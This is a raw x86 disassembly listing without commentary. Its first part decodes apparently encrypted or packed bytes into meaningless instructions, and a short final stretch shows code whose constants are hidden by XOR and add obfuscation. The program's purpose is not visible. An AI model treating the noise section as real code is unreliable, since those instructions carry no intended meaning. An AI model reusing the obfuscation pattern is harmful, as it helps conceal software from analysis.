  4058bb:	retf   
  4058bc:	dec    edi
  4058bd:	sahf   
  4058be:	ins    BYTE PTR es:[edi],dx
  4058bf:	jnp    0x4058a6
  4058c1:	icebp  
  4058c2:	or     ch,ah
  4058c4:	add    bl,BYTE PTR [eax+eiz*1]
  4058c7:	fwait
  4058c8:	mov    cl,0x32
  4058ca:	or     al,0xdf
  4058cc:	jg     0x4058f7
  4058ce:	pop    esi
  4058cf:	outs   dx,BYTE PTR ds:[esi]
  4058d0:	xor    DWORD PTR [eax-0x69304fd7],esi
  4058d6:	aad    0xb6
  4058d8:	add    eax,0x57494bff
  4058dd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4058de:	dec    edx
  4058df:	pop    eax
  4058e0:	retf   
  4058e1:	sub    esp,esi
  4058e3:	and    al,0x36
  4058e5:	icebp  
  4058e6:	inc    ecx
  4058e7:	rol    DWORD PTR [esi-0x19],1
  4058ea:	call   0xe180ecaa
  4058ef:	aas    
  4058f0:	mov    bh,0x55
  4058f2:	iret   
  4058f3:	xor    al,0xa5
  4058f5:	lock inc ebx
  4058f7:	push   cs
  4058f8:	mov    DWORD PTR [edx-0x713358df],ebp
  4058fe:	mov    dh,0xc7
  405900:	loop   0x4058f0
  405902:	scas   eax,DWORD PTR es:[edi]
  405903:	xor    bl,BYTE PTR [ecx]
  405905:	cmp    cl,BYTE PTR [eax]
  405907:	lea    eax,[ecx+0x51]
  40590a:	test   al,0x1a
  40590c:	fldenv [ebx+0x7]
  40590f:	push   ebx
  405910:	push   esp
  405911:	rol    DWORD PTR [eax+0x374299ae],cl
  405917:	or     DWORD PTR ds:0xd20638c2,ebp
  40591d:	mov    al,0xe4
  40591f:	pushw  ss
  405921:	cmp    DWORD PTR [edi-0x72],ecx
  405924:	out    0x87,eax
  405926:	les    edi,FWORD PTR [edi]
  405928:	xor    edx,eax
  40592a:	mov    al,0xe3
  40592c:	mov    eax,0x6721e84d
  405931:	out    dx,eax
  405932:	aad    0x6c
  405934:	adc    al,0x32
  405936:	rol    bl,1
  405938:	mov    ecx,0x48a4230a
  40593d:	outs   dx,BYTE PTR ds:[esi]
  40593e:	cmp    edi,DWORD PTR [ebp-0x25]
  405941:	faddp  st(6),st
  405943:	mov    dh,0xe1
  405945:	sbb    dl,dh
  405947:	mov    al,ds:0xb5572bc7
  40594c:	mov    dl,0x6f
  40594e:	xor    esp,edi
  405950:	xor    DWORD PTR [edx+0x70f19a79],0x4e
  405957:	idiv   BYTE PTR ds:0xf879eb4c
  40595d:	sub    dh,BYTE PTR [ecx]
  40595f:	sbb    BYTE PTR [edi+0x657bccfb],0x27
  405966:	cli    
  405967:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405968:	mov    eax,ds:0x6c0fa5cc
  40596d:	pop    es
  40596e:	cmp    dh,BYTE PTR [ebx-0x564fc77b]
  405974:	push   0xd38a9457
  405979:	enter  0x19e1,0x24
  40597d:	mov    edi,0xd1eecee2
  405982:	xchg   DWORD PTR [ecx],edi
  405984:	mov    edi,0xf68fabad
  405989:	add    eax,0xeaa33db6
  40598e:	mov    edi,0x190fe51d
  405993:	cs push ecx
  405995:	dec    ebx
  405996:	mov    ebx,0x73c224f7
  40599b:	call   0xe788:0xc4e070f2
  4059a2:	inc    edi
  4059a3:	pop    ebp
  4059a4:	mov    bh,0x64
  4059a6:	mov    bp,0x34cf
  4059aa:	fstp   TBYTE PTR [edx+0x3d]
  4059ad:	push   cs
  4059ae:	mov    bh,0xb7
  4059b0:	jmp    0x9a750be5
  4059b5:	sub    dh,BYTE PTR [edi+edi*2]
  4059b8:	stc    
  4059b9:	cmp    DWORD PTR [ecx],eax
  4059bb:	setno  dh
  4059be:	loope  0x4059e2
  4059c0:	retf   
  4059c1:	into   
  4059c2:	adc    eax,0xc0302bdb
  4059c7:	mov    ebx,0x36df8ca8
  4059cc:	xchg   edx,eax
  4059cd:	or     cl,BYTE PTR [ecx]
  4059cf:	adc    ebp,DWORD PTR [ecx]
  4059d1:	popa   
  4059d2:	pop    es
  4059d3:	repz xchg ebp,eax
  4059d5:	loop   0x4059a7
  4059d7:	cmp    al,0x87
  4059d9:	ins    WORD PTR es:[edi],dx
  4059db:	jp     0x405a4f
  4059dd:	sahf   
  4059de:	in     al,dx
  4059df:	shl    BYTE PTR [eax+eax*8+0x291abe],0x50
  4059e7:	jne    0x405a47
  4059e9:	lds    esp,FWORD PTR [edi+0x30313e60]
  4059ef:	and    BYTE PTR [ecx-0x42],cl
  4059f2:	adc    BYTE PTR [di+0x5a62],0x57
  4059f8:	loop   0x4059bd
  4059fa:	ja     0x40597e
  4059fc:	push   ebx
  4059fd:	sbb    ebp,ebx
  4059ff:	fdiv   DWORD PTR [esp+ecx*1-0x24ccba42]
  405a06:	leave  
  405a07:	fadd   QWORD PTR ds:0x34d907dc
  405a0d:	xor    BYTE PTR [esi-0x6993d216],ah
  405a13:	in     al,0xe0
  405a15:	das    
  405a16:	icebp  
  405a17:	popa   
  405a18:	mov    bl,bh
  405a1a:	retf   0x30d9
  405a1d:	jg     0x4059aa
  405a1f:	out    0xfd,eax
  405a21:	lock jb 0x405a4b
  405a24:	nop
  405a25:	lea    eax,[ecx-0x2014b3cf]
  405a2b:	mov    dl,0x2a
  405a2d:	test   DWORD PTR [ecx+esi*8],edi
  405a30:	xchg   edx,eax
  405a31:	je     0x405a64
  405a33:	sub    eax,0xe3d84f8b
  405a38:	xchg   BYTE PTR [edi-0x19b20a6a],bl
  405a3e:	sbb    al,0x6d
  405a40:	ins    BYTE PTR es:[edi],dx
  405a41:	call   0x196812e2
  405a46:	retf   
  405a47:	jmp    0x148beeb0
  405a4c:	retf   0x1d09
  405a4f:	pusha  
  405a50:	sti    
  405a51:	mov    ds:0xbd058494,eax
  405a56:	mov    BYTE PTR [esi],cl
  405a58:	ss mov eax,gs:0x48875841
  405a5f:	mov    ?,WORD PTR [edx-0x71]
  405a62:	call   0xde88:0x95420d38
  405a69:	or     BYTE PTR [ecx-0x45],ch
  405a6c:	cmp    dh,dh
  405a6e:	out    dx,eax
  405a6f:	popa   
  405a70:	inc    eax
  405a71:	jne    0x4059fd
  405a73:	(bad)  
  405a74:	adc    ah,BYTE PTR [ecx-0x594da99f]
  405a7a:	(bad)  [eax]
  405a7c:	xlat   BYTE PTR ds:[ebx]
  405a7d:	and    BYTE PTR [edx+esi*4+0x2d],ah
  405a81:	dec    esp
  405a82:	add    bl,cl
  405a84:	fisubr WORD PTR [ebp+0x18]
  405a87:	mov    bl,0xf7
  405a89:	sub    al,BYTE PTR [edi-0x73]
  405a8c:	mov    cl,0x5b
  405a8e:	test   bl,0xd6
  405a91:	sub    eax,0x107d7610
  405a96:	shr    BYTE PTR [eax+0x760899f7],1
  405a9c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405a9d:	xor    al,0xec
  405a9f:	push   ebp
  405aa0:	popa   
  405aa1:	add    eax,0x12f894d4
  405aa6:	or     eax,0x1b35d608
  405aab:	mov    eax,ds:0x4969031a
  405ab0:	jge    0x405ad1
  405ab2:	push   0x82ca4bcd
  405ab7:	inc    esp
  405ab8:	add    bh,BYTE PTR [eax-0x5cef620f]
  405abe:	pcmpgtd mm2,QWORD PTR [esi]
  405ac1:	addr16 (bad) 
  405ac3:	les    edi,FWORD PTR [ebp+0x7c]
  405ac6:	and    eax,0x9369de5e
  405acb:	and    DWORD PTR [edi-0x63631760],ebp
  405ad1:	pushf  
  405ad2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405ad3:	pop    ebp
  405ad4:	into   
  405ad5:	push   edi
  405ad6:	into   
  405ad7:	xor    al,0x33
  405ad9:	or     DWORD PTR [ebx+0x3],esp
  405adc:	cmp    eax,0x60ebf392
  405ae1:	imul   esi,DWORD PTR [ebx-0x377787fc],0x60c890a3
  405aeb:	pop    es
  405aec:	adc    BYTE PTR [eax-0x39],0x7d
  405af0:	xchg   edx,eax
  405af1:	sub    al,BYTE PTR [edi]
  405af3:	cdq    
  405af4:	mov    edi,0xbf3b198b
  405af9:	mov    ch,0xe9
  405afb:	loope  0x405a94
  405afd:	mov    dh,bh
  405aff:	clc    
  405b00:	jne    0x405af5
  405b02:	in     eax,0x30
  405b04:	or     DWORD PTR [eax],ebp
  405b06:	inc    ebp
  405b07:	mov    al,ds:0x56df1161
  405b0c:	pushf  
  405b0d:	mov    al,0xd1
  405b0f:	mov    gs,WORD PTR [ecx+0x218e236d]
  405b15:	add    bh,al
  405b17:	cld    
  405b18:	imul   ecx,DWORD PTR [esi],0x5f
  405b1b:	add    BYTE PTR [esi],al
  405b1d:	or     ecx,DWORD PTR [eax]
  405b1f:	ja     0x405b84
  405b21:	fmul   QWORD PTR ss:[ebp+0x2d]
  405b25:	scas   eax,DWORD PTR es:[edi]
  405b26:	nop
  405b27:	aad    0x2
  405b29:	cmp    DWORD PTR [eax],eax
  405b2b:	js     0x405b3d
  405b2d:	push   edi
  405b2e:	retf   0x2ce8
  405b31:	dec    ebx
  405b32:	aam    0x4e
  405b34:	mov    al,ds:0xde1c4e07
  405b39:	lahf   
  405b3a:	fs popa 
  405b3c:	std    
  405b3d:	ss xchg edi,eax
  405b3f:	mov    bh,0xa0
  405b41:	ss pusha 
  405b43:	sbb    ecx,eax
  405b45:	popa   
  405b46:	xor    esp,0x3fca5268
  405b4c:	sbb    ah,dl
  405b4e:	xor    ah,dl
  405b50:	mov    dl,0x32
  405b52:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405b53:	inc    ecx
  405b54:	mov    bl,0x73
  405b56:	inc    eax
  405b57:	stos   BYTE PTR es:[edi],al
  405b58:	retf   0x96dd
  405b5b:	jo     0x405b87
  405b5d:	outs   dx,BYTE PTR ds:[esi]
  405b5e:	cmp    dl,BYTE PTR [eax]
  405b60:	mov    ebx,0x5a202e9d
  405b65:	push   si
  405b67:	jno    0x405b57
  405b69:	mov    gs,WORD PTR [esp+edx*8-0x1a]
  405b6d:	ss fcmovnb st,st(5)
  405b70:	adc    edx,DWORD PTR [esi+0x2b]
  405b73:	push   ecx
  405b74:	inc    esi
  405b75:	add    DWORD PTR ds:0xc90abff9,eax
  405b7b:	inc    esp
  405b7c:	nop
  405b7d:	add    bh,BYTE PTR [ebp-0x24]
  405b80:	xor    DWORD PTR [bp+di-0x4a17],0xf78bf76b
  405b89:	shl    BYTE PTR [edx],0x76
  405b8c:	adc    edi,DWORD PTR [ebx+0x498b791f]
  405b92:	cli    
  405b93:	outs   dx,BYTE PTR ds:[esi]
  405b94:	mov    BYTE PTR [ecx],dh
  405b96:	in     al,dx
  405b97:	cli    
  405b98:	aam    0x37
  405b9a:	or     eax,0xc0235b56
  405b9f:	lea    esp,[edi]
  405ba1:	cmp    eax,0x8e931111
  405ba6:	nop
  405ba7:	dec    ecx
  405ba8:	mov    esp,0xc3a5fef4
  405bad:	(bad)  
  405bae:	std    
  405baf:	jl     0x405b6b
  405bb1:	std    
  405bb2:	ins    BYTE PTR es:[edi],dx
  405bb3:	fsubr  QWORD PTR [ebx+0x78]
  405bb6:	jl     0x405c1e
  405bb8:	pop    ebx
  405bb9:	(bad)  
  405bba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405bbb:	xor    DWORD PTR [ebx-0x5d],esp
  405bbe:	push   cs
  405bbf:	xchg   ecx,eax
  405bc0:	pop    esp
  405bc1:	cmp    BYTE PTR [esi+0x3112c78c],ah
  405bc7:	mov    ebp,0xdb316226
  405bcc:	sub    edx,DWORD PTR [ebx+0x71]
  405bcf:	mov    al,ds:0x30e8b5cf
  405bd4:	pop    ss
  405bd5:	xor    DWORD PTR ss:[ebp-0x147ecd40],0xffffffd5
  405bdd:	jle    0x405b88
  405bdf:	fidivr DWORD PTR [ecx+0x44]
  405be2:	mov    esp,0x24a31e7b
  405be7:	adc    al,0xd9
  405be9:	dec    esi
  405bea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405beb:	inc    ecx
  405bec:	mov    esp,0xce07bace
  405bf1:	inc    esp
  405bf2:	mov    ebp,0x9f76c81
  405bf7:	mov    eax,ds:0x6e3c25fe
  405bfc:	push   ss
  405bfd:	call   0xfca0b9bf
  405c02:	cli    
  405c03:	dec    edi
  405c04:	es inc edx
  405c06:	inc    esp
  405c07:	or     DWORD PTR [ebp-0x3ae48a98],ebp
  405c0d:	and    esi,DWORD PTR [ebp+0x14]
  405c10:	cmp    bl,dh
  405c12:	add    DWORD PTR [edi+0x49],ecx
  405c15:	and    eax,DWORD PTR [ecx-0x9d0396]
  405c1b:	cmp    dh,dh
  405c1d:	lahf   
  405c1e:	push   0x57f1abde
  405c23:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405c24:	mov    ah,0xa7
  405c26:	ret    
  405c27:	sbb    al,0xf
  405c29:	push   ecx
  405c2a:	rcr    BYTE PTR [edx+ebp*4],0x54
  405c2e:	je     0x405c43
  405c30:	(bad)  
  405c31:	fldenv [ecx+esi*2-0x75160a5b]
  405c38:	jge    0x405c2e
  405c3a:	popf   
  405c3b:	test   BYTE PTR [eax],ch
  405c3d:	sar    BYTE PTR [eax],cl
  405c3f:	mov    ah,0x51
  405c41:	out    dx,al
  405c42:	mov    edi,0x71478ee
  405c47:	test   eax,0x4dcae75e
  405c4c:	push   edi
  405c4d:	ror    DWORD PTR [ecx-0x7a],cl
  405c50:	inc    edx
  405c51:	gs push es
  405c53:	push   ds
  405c54:	mov    dh,BYTE PTR [edi+eax*2]
  405c57:	imul   ebx,eax,0xab08a549
  405c5d:	leave  
  405c5e:	repz mov dh,0x62
  405c61:	cmp    eax,0x846e47b7
  405c66:	sbb    ebx,DWORD PTR [ecx]
  405c68:	jno    0x405cad
  405c6a:	ja     0x405ca9
  405c6c:	ret    
  405c6d:	pushf  
  405c6e:	test   BYTE PTR [ecx-0x38],dl
  405c71:	lods   eax,DWORD PTR ds:[esi]
  405c72:	gs into 
  405c74:	mov    al,0x2a
  405c76:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405c77:	outs   dx,DWORD PTR ds:[esi]
  405c78:	mov    WORD PTR [esi+0x2e0d5e21],cs
  405c7e:	(bad)  
  405c80:	jnp    0x405c08
  405c82:	sub    al,0xb9
  405c84:	dec    eax
  405c85:	popf   
  405c86:	push   cs
  405c87:	imul   esp,DWORD PTR [eax],0xffffffde
  405c8a:	mov    edx,DWORD PTR [eax+ebp*1+0x31abfc11]
  405c91:	sbb    BYTE PTR ds:0xf8acb1e1,bl
  405c97:	sub    al,0x7f
  405c99:	dec    ebx
  405c9a:	ffree  st(1)
  405c9c:	sbb    BYTE PTR [esi+0x7d70d7f],0xa1
  405ca3:	imul   ebp,DWORD PTR [edx+edi*1+0x69a6ecf2],0x7d
  405cab:	xchg   edi,eax
  405cac:	(bad)  [esi+0x64]
  405caf:	jp     0x405cba
  405cb1:	pop    esi
  405cb2:	pop    ds
  405cb3:	add    edi,esp
  405cb5:	push   ebp
  405cb6:	pop    es
  405cb7:	xchg   ebp,eax
  405cb8:	in     al,0x1c
  405cba:	add    BYTE PTR [ebx-0x42],ah
  405cbd:	xchg   BYTE PTR [ebp+eiz*8-0x2932aa7c],bl
  405cc4:	cld    
  405cc5:	(bad)  
  405cc6:	push   0xfffffff0
  405cc8:	int    0x45
  405cca:	fsubp  st(6),st
  405ccc:	push   0x13
  405cce:	or     bh,BYTE PTR [ebx]
  405cd0:	out    0x75,eax
  405cd2:	xchg   esi,eax
  405cd3:	xlat   BYTE PTR ds:[ebx]
  405cd4:	aaa    
  405cd5:	popf   
  405cd6:	xor    edi,edi
  405cd8:	mov    esp,0x9cb3410d
  405cdd:	retf   
  405cde:	jne    0x405ccf
  405ce0:	popa   
  405ce1:	inc    eax
  405ce2:	imul   ebp,DWORD PTR [ebp+eax*2-0x4a],0x66
  405ce7:	adc    bh,0x38
  405cea:	jne    0x405ca1
  405cec:	fldenv [edx]
  405cee:	into   
  405cef:	sub    edi,DWORD PTR [ecx-0x65]
  405cf2:	in     al,dx
  405cf3:	retf   0xaff6
  405cf6:	mov    ds:0x1737ac3,al
  405cfb:	mov    bh,BYTE PTR [ebx-0x7b]
  405cfe:	dec    ebx
  405cff:	xor    al,bl
  405d01:	push   ds
  405d02:	jmp    0x405d49
  405d04:	and    eax,0x75583f69
  405d09:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405d0a:	jnp    0x405cf2
  405d0c:	add    al,0x24
  405d0e:	pop    edi
  405d0f:	pop    ss
  405d10:	sbb    BYTE PTR [eax+0x52],0x2d
  405d14:	xchg   edi,eax
  405d15:	sub    eax,ebp
  405d17:	sbb    esi,DWORD PTR [eax+ecx*2]
  405d1a:	mov    edi,0x9c1ec7b2
  405d1f:	push   ebx
  405d20:	xchg   edx,eax
  405d21:	pop    es
  405d22:	enter  0xf8c6,0x4b
  405d26:	inc    edx
  405d27:	hlt    
  405d28:	out    0x90,al
  405d2a:	cld    
  405d2b:	jns    0x405cff
  405d2d:	aas    
  405d2e:	es mov ecx,0xba1ffd15
  405d34:	mov    BYTE PTR [eax],dh
  405d36:	in     al,0xac
  405d38:	and    DWORD PTR [eax],ebx
  405d3a:	cmp    eax,0xf7438b97
  405d3f:	xchg   esi,eax
  405d40:	dec    edi
  405d41:	pusha  
  405d42:	loope  0x405d2a
  405d44:	ret    0x37ce
  405d47:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405d48:	mov    ds:0x19bbe78c,al
  405d4d:	add    BYTE PTR cs:[ecx],dh
  405d50:	dec    esi
  405d51:	xor    al,dh
  405d53:	sub    al,0x87
  405d55:	cmp    ecx,esp
  405d57:	in     al,dx
  405d58:	push   cs
  405d59:	cmova  esi,DWORD PTR [eax+ebp*8+0x5e]
  405d5e:	in     eax,dx
  405d5f:	push   ss
  405d60:	push   ecx
  405d61:	mov    eax,ds:0x36ea12eb
  405d66:	mov    bh,0xe7
  405d68:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405d69:	jne    0x405d7e
  405d6b:	sahf   
  405d6c:	jbe    0x405d06
  405d6e:	dec    edx
  405d6f:	cmp    ah,BYTE PTR [ecx+0x7e2c8ee7]
  405d75:	mov    eax,ds:0x7c20c230
  405d7a:	mov    al,ds:0xb3801614
  405d7f:	imul   edx,DWORD PTR [esp+esi*4-0x14],0x31
  405d84:	push   ecx
  405d85:	dec    ebx
  405d86:	push   ds
  405d87:	push   esp
  405d88:	hlt    
  405d89:	xor    al,0x19
  405d8b:	es mov edx,0xe6a2965f
  405d91:	xchg   edx,eax
  405d92:	jmp    0x405e07
  405d94:	popf   
  405d95:	(bad)  
  405d96:	cs jo  0x405d4f
  405d99:	stc    
  405d9a:	mov    ah,0x27
  405d9c:	sub    ecx,ecx
  405d9e:	inc    edx
  405d9f:	retf   
  405da0:	or     DWORD PTR [ecx],0xfffffff5
  405da3:	ins    DWORD PTR es:[edi],dx
  405da4:	xor    al,0x1c
  405da6:	mov    ds:0x92030d34,eax
  405dab:	std    
  405dac:	dec    ebx
  405dad:	fucom  st(3)
  405daf:	xor    al,0x4d
  405db1:	jmp    0x405d9f
  405db3:	and    dh,cl
  405db5:	mov    ch,BYTE PTR [edx-0x306f9a13]
  405dbb:	ret    
  405dbc:	data16 mov bh,BYTE PTR [eax+eiz*8+0x7593f48b]
  405dc4:	mov    ds:0xd11f1112,eax
  405dc9:	imul   BYTE PTR [eax]
  405dcb:	cwde   
  405dcc:	pop    es
  405dcd:	add    dh,BYTE PTR [esi+0x7e6e25f6]
  405dd3:	add    bh,ah
  405dd5:	jl     0x405df6
  405dd7:	push   ss
  405dd8:	adc    eax,0x5c328c4e
  405ddd:	add    al,0xec
  405ddf:	push   ebp
  405de0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405de1:	sbb    eax,0x2c186cf0
  405de6:	adc    ch,BYTE PTR [edi-0x1]
  405de9:	lahf   
  405dea:	push   0x4ad37682
  405def:	lods   al,BYTE PTR ds:[esi]
  405df0:	test   eax,edi
  405df2:	clc    
  405df3:	or     cl,bl
  405df5:	push   eax
  405df6:	adc    al,0x7
  405df8:	xor    eax,0x7f75d4ae
  405dfd:	add    al,0x93
  405dff:	ins    DWORD PTR es:[edi],dx
  405e00:	fsub   DWORD PTR [eax+0x625b12a6]
  405e06:	cld    
  405e07:	mov    ebp,0xede73313
  405e0c:	scas   eax,DWORD PTR es:[edi]
  405e0d:	cld    
  405e0e:	les    ebx,FWORD PTR [ebp-0x32]
  405e11:	dec    ecx
  405e12:	or     ah,bl
  405e14:	jnp    0x405dc3
  405e16:	cmp    ebx,ecx
  405e18:	jge    0x405e59
  405e1a:	fnstcw WORD PTR ss:[ebx]
  405e1d:	pop    edx
  405e1e:	mov    WORD PTR [ebp+0x1c],gs
  405e21:	fcomp  QWORD PTR [eax+edi*4]
  405e24:	imul   ebp,DWORD PTR es:[ebx-0x580d91e3],0x94bb13df
  405e2f:	addr16 jo 0x405dd3
  405e32:	gs mov ch,0x1c
  405e35:	popf   
  405e36:	mov    bl,BYTE PTR gs:[esi+0x18]
  405e3a:	and    ebx,DWORD PTR [ebp-0x64908bb8]
  405e40:	mov    al,0x9
  405e42:	and    DWORD PTR [esp+edi*2-0x2bad37b0],edi
  405e49:	fistp  DWORD PTR [edi]
  405e4b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405e4c:	das    
  405e4d:	and    ecx,DWORD PTR [ecx-0x17]
  405e50:	pop    edx
  405e51:	xor    DWORD PTR [edx],0xffbfabd0
  405e57:	sbb    ah,cl
  405e59:	mov    ebp,0xfea8bb84
  405e5e:	repnz hlt 
  405e60:	add    dl,cl
  405e62:	sbb    bh,BYTE PTR [eax*8-0x1eeb9ee4]
  405e69:	imul   edi,ebx,0xffffffcd
  405e6c:	or     ch,BYTE PTR [ebx-0x51]
  405e6f:	out    0x20,al
  405e71:	inc    esi
  405e72:	adc    BYTE PTR [ebp+ebx*4-0x1b0067f5],ch
  405e79:	gs (bad) 
  405e7b:	in     eax,dx
  405e7c:	ror    BYTE PTR [ebp-0x6a],0x6b
  405e80:	pop    es
  405e81:	(bad)  
  405e82:	icebp  
  405e83:	call   0x5b1297c5
  405e88:	sbb    esp,ebp
  405e8a:	jne    0x405e2f
  405e8c:	lds    edi,FWORD PTR [ebp+0x5e111fd5]
  405e92:	lock xchg edx,eax
  405e94:	ins    BYTE PTR es:[edi],dx
  405e95:	dec    ebp
  405e96:	out    0x1c,al
  405e98:	push   ecx
  405e99:	push   esp
  405e9a:	clc    
  405e9b:	push   ds
  405e9c:	cmc    
  405e9d:	sub    BYTE PTR [ebp*1-0x4e09ec13],cl
  405ea4:	push   esp
  405ea5:	and    dh,BYTE PTR [eax-0x7da06b02]
  405eab:	in     al,0x21
  405ead:	pop    ebp
  405eae:	push   ebp
  405eaf:	sub    eax,0x6181608
  405eb4:	pop    ebp
  405eb5:	fcmovnu st,st(5)
  405eb7:	add    al,BYTE PTR [eax-0x31]
  405eba:	mov    edi,0x6061492b
  405ebf:	cwde   
  405ec0:	data16 xor cl,BYTE PTR [ecx+eax*4]
  405ec4:	retf   0x2fbc
  405ec7:	jge    0x405eb0
  405ec9:	jecxz  0x405e5f
  405ecb:	clc    
  405ecc:	sahf   
  405ecd:	push   cs
  405ece:	cmp    dl,BYTE PTR [edx-0x24cc2789]
  405ed4:	sbb    eax,0x46b29a8b
  405ed9:	adc    ch,al
  405edb:	add    esp,DWORD PTR [eax+0x28]
  405ede:	repz imul esi,DWORD PTR [eax],0xa441f71e
  405ee5:	loop   0x405e7c
  405ee7:	into   
  405ee8:	xchg   BYTE PTR [ebp+0x7f24b818],bh
  405eee:	jne    0x405f34
  405ef0:	nop
  405ef1:	lods   eax,DWORD PTR ds:[esi]
  405ef2:	nop
  405ef3:	int    0x17
  405ef5:	xchg   ebp,ecx
  405ef7:	jp     0x405f23
  405ef9:	popa   
  405efa:	retf   
  405efb:	adc    bh,bh
  405efd:	dec    edi
  405efe:	lods   eax,DWORD PTR ds:[esi]
  405eff:	bound  edx,QWORD PTR [edx]
  405f01:	ds stos BYTE PTR es:[edi],al
  405f03:	xchg   ebx,eax
  405f04:	add    BYTE PTR [ebp-0x2c],0xe6
  405f08:	push   esp
  405f09:	sahf   
  405f0a:	or     ecx,ebx
  405f0c:	jnp    0x405eab
  405f0e:	cmp    eax,0xb8721605
  405f13:	rcl    BYTE PTR [esi],1
  405f15:	push   ecx
  405f16:	into   
  405f17:	popf   
  405f18:	mov    dh,0xa7
  405f1a:	cmp    al,0xf0
  405f1c:	sub    DWORD PTR [edi+0x50f9251c],esi
  405f22:	ret    0x3d41
  405f25:	call   0x734d:0xea120f4c
  405f2c:	in     al,0x99
  405f2e:	inc    ebx
  405f2f:	aaa    
  405f30:	or     DWORD PTR [ecx-0x696989d0],0xfffffff7
  405f37:	jmp    DWORD PTR [ebx]
  405f39:	jle    0x405f0c
  405f3b:	jbe    0x405f46
  405f3d:	fs mov al,0xf1
  405f40:	jp     0x405f8f
  405f42:	std    
  405f43:	jne    0x405f00
  405f45:	jne    0x405f65
  405f47:	mov    DWORD PTR [ebp-0x2c],eax
  405f4a:	mov    eax,DWORD PTR [ebp-0x58]
  405f4d:	sub    eax,ecx
  405f4f:	mov    DWORD PTR [ebp-0x1c],eax
  405f52:	mov    eax,DWORD PTR [ebp-0x1c]
  405f55:	mov    DWORD PTR [ebp-0x14],eax
  405f58:	mov    eax,DWORD PTR [ebp-0x2c]
  405f5b:	mov    DWORD PTR [ebp-0x38],0xf89c85b5
  405f62:	mov    DWORD PTR [ebp-0x54],eax
  405f65:	mov    DWORD PTR [ebp-0x20],0xf89c85b4
  405f6c:	mov    eax,DWORD PTR [ebp-0x38]
  405f6f:	xor    eax,esi
  405f71:	add    eax,edi
  405f73:	mov    DWORD PTR [ebp-0x10],eax
  405f76:	mov    eax,DWORD PTR [ebp-0x38]
  405f79:	xor    eax,esi
  405f7b:	add    eax,edi
  405f7d:	mov    DWORD PTR [ebp-0x8],eax
  405f80:	mov    DWORD PTR [ebp-0x2c],0xf89c8595
  405f87:	mov    DWORD PTR [ebp-0x44],0xf89c85be
  405f8e:	mov    eax,DWORD PTR [ebp-0x38]
  405f91:	mov    edx,DWORD PTR [ebp-0x14]
  405f94:	xor    eax,esi
  405f96:	add    eax,edi
  405f98:	cmp    edx,eax
  405f9a:	je     0x40852b
  405fa0:	mov    eax,DWORD PTR [ebp-0x20]
  405fa3:	xor    eax,esi
  405fa5:	mov    edx,0xffcd8d06
  405faa:	sub    edx,eax
  405fac:	add    edx,DWORD PTR [ebp-0x14]
  405faf:	mov    eax,DWORD PTR [ebp-0x20]
  405fb2:	mov    ebx,DWORD PTR [ebp-0x10]
  405fb5:	xor    eax,esi
  405fb7:	add    eax,edi
  405fb9:	imul   eax,ebx
  405fbc:	cmp    eax,edx
  405fbe:	ja     0x408528
  405fc4:	mov    edx,DWORD PTR [ebp-0x10]
  405fc7:	mov    eax,DWORD PTR [ebp-0x14]
  405fca:	mov    ebx,DWORD PTR [ebp-0x2c]
  405fcd:	sub    eax,edx
  405fcf:	xor    ebx,esi
  405fd1:	xor    edx,edx
  405fd3:	add    ebx,edi
  405fd5:	div    ebx
  405fd7:	mov    DWORD PTR [ebp-0x8],eax
  405fda:	mov    eax,DWORD PTR [ebp-0x44]
  405fdd:	mov    edx,DWORD PTR [ebp-0x8]
  405fe0:	xor    eax,esi
  405fe2:	add    eax,edi
  405fe4:	cmp    edx,eax
  405fe6:	jbe    0x405ff6
  405fec:	mov    eax,DWORD PTR [ebp-0x44]
  405fef:	xor    eax,esi
  405ff1:	add    eax,edi
  405ff3:	mov    DWORD PTR [ebp-0x8],eax
  405ff6:	mov    eax,DWORD PTR [ebp-0x2c]
  405ff9:	mov    edx,DWORD PTR [ebp-0x8]
  405ffc:	xor    eax,esi
  405ffe:	add    eax,edi
  406000:	imul   eax,edx
  406003:	mov    DWORD PTR [ebp-0x8],eax
  406006:	mov    eax,DWORD PTR [ebp-0x38]
  406009:	mov    edx,DWORD PTR [ebp-0x8]
  40600c:	xor    eax,esi
  40600e:	add    eax,edi
  406010:	cmp    edx,eax
  406012:	je     0x408511
  406018:	mov    eax,DWORD PTR [ebp-0x8]
  40601b:	mov    DWORD PTR [ebp-0x18],eax
  40601e:	mov    eax,DWORD PTR [ebp-0x10]
  406021:	add    eax,DWORD PTR [ebp-0x54]
  406024:	mov    DWORD PTR [ebp-0x1c],0xf89c85b5
  40602b:	mov    DWORD PTR [ebp-0x8],eax
  40602e:	mov    eax,0xf89c85b4
  406033:	mov    DWORD PTR [ebp-0x28],eax
  406036:	mov    DWORD PTR [ebp-0x5c],0xf89c85bb
  40603d:	mov    DWORD PTR [ebp-0x40],0xf89c85ba
  406044:	mov    DWORD PTR [ebp-0x30],eax
  406047:	mov    eax,DWORD PTR [ebp-0x1c]
  40604a:	xor    eax,esi
  40604c:	add    eax,edi
  40604e:	jmp    0x4084cd
  406053:	mov    DWORD PTR [ebp-0x4c],0xf89c85a2
  40605a:	mov    DWORD PTR [ebp-0x50],0xf89c85af
  406061:	mov    eax,DWORD PTR [ebp-0x30]
  406064:	mov    edx,DWORD PTR [ebp-0xc]
  406067:	xor    eax,esi
  406069:	add    eax,edi
  40606b:	imul   eax,edx
  40606e:	mov    edx,DWORD PTR [ebp-0x8]
  406071:	mov    al,BYTE PTR [eax+edx*1]
  406074:	mov    BYTE PTR [ebp-0x1],al
  406077:	mov    eax,DWORD PTR [ebp-0x30]
  40607a:	mov    edx,DWORD PTR [ebp-0xc]
  40607d:	xor    eax,esi
  40607f:	add    eax,edi
  406081:	imul   eax,edx
  406084:	mov    edx,DWORD PTR [ebp-0x5c]
